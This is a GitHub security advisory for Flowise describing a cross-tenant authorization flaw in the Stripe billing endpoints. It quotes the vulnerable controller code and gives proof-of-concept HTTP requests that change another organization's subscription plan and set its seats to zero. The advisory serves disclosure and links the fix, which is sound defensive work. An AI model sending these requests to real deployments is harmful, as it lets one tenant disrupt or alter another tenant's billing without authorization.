# [H] Flowise: Broken Access Control in Stripe Subscription Endpoints Allows Cross-Tenant Billing Manipulation

## Summary
Severity: High
Advisory: GHSA-gmmw-qg98-6j6p
CVE: CVE-2026-70476
CWE: CWE-284, CWE-639
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-04
Source: https://github.com/advisories/GHSA-gmmw-qg98-6j6p
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.1.3

## Details
### Summary
Several organization billing endpoints accept attacker-controlled Stripe identifiers (subscriptionId) without verifying that the identifier belongs to the authenticated user's organization. This allows an authenticated attacker to perform unauthorized Stripe subscription operations on other tenants. As a result, an authenticated user can manipulate the Stripe subscription of another organization by supplying a victim organization's subscriptionId.

This allows attackers to perform unauthorized billing operations such as changing subscription plans or modifying seat quantities, resulting in potential financial impact and service disruption.


### Details
Multiple organization billing endpoints accept subscriptionId directly from user input without validating ownership. The server relies on a client-supplied Stripe subscription identifier rather than resolving the subscription from the authenticated user's organization context.

**File**

packages/server/src/enterprise/routes/organization.route.ts

Affected routes:

```typescript
router.post('/update-additional-seats', organizationController.updateAdditionalSeats)
router.post('/update-subscription-plan', organizationController.updateSubscriptionPlan)
updateSubscriptionPlan
```

**File**

packages/server/src/enterprise/controllers/organization.controller.ts

```typescript
public async updateSubscriptionPlan(req: Request, res: Response, next: NextFunction) {
    const { subscriptionId, newPlanId, prorationDate } = req.body

    const identityManager = getRunningExpressApp().identityManager

    const result = await identityManager.updateSubscriptionPlan(
        req,
        subscriptionId,
        newPlanId,
        prorationDate
    )

    return res.status(StatusCodes.OK).json(result)
}
```

The server trusts the user-supplied subscriptionId and forwards it to the Stripe integration layer.

Missing validation:
subscriptionId belongs to req.user.activeOrganization

updateAdditionalSeats

```typescript
public async updateAdditionalSeats(req: Request, res: Response, next: NextFunction) {
    const { subscriptionId, quantity, prorationDate } = req.body

    const identityManager = getRunningExpressApp().identityManager

    const result = await identityManager.updateAdditionalSeats(
        subscriptionId,
        quantity,
        prorationDate
    )

    return res.status(StatusCodes.OK).json(result)
}
```

Again, the subscriptionId is taken directly from the request body without verifying ownership.

### PoC
Step 1 - Obtain victim subscriptionId

This identifier may be obtained via the organization read endpoint or other exposed references.

Example:

sub_YYYYYYYYYYYY

Step 2 - Modify victim subscription

```http
POST /api/v1/organization/update-subscription-plan
Host: target.example.com
Cookie: token=<attacker-session>
Content-Type: application/json

{
  "subscriptionId": "sub_YYYYYYYYYYYY",
  "newPlanId": "free_plan_id",
  "prorationDate": 1735689600
}
```

Step 3 - Change seat quantity

```http
POST /api/v1/organization/update-additional-seats
Host: target.example.com
Cookie: token=<attacker-session>
Content-Type: application/json

{
  "subscriptionId": "sub_YYYYYYYYYYYY",
  "quantity": 0,
  "prorationDate": 1735689600
}
```

### Impact
An authenticated attacker can manipulate the Stripe subscription of other organizations.

Possible consequences include:

- Unauthorized subscription upgrades to higher-priced plans
- Manipulation of paid seat quantities leading to unintended charges
- Service disruption through plan downgrades

Because the vulnerability allows cross-tenant manipulation of billing resources, it represents a high-impact authorization flaw.

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-gmmw-qg98-6j6p
- https://github.com/FlowiseAI/Flowise/pull/6321
- https://github.com/FlowiseAI/Flowise/commit/4d7899d02ca370a5510406be5c91483085a412f9
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3
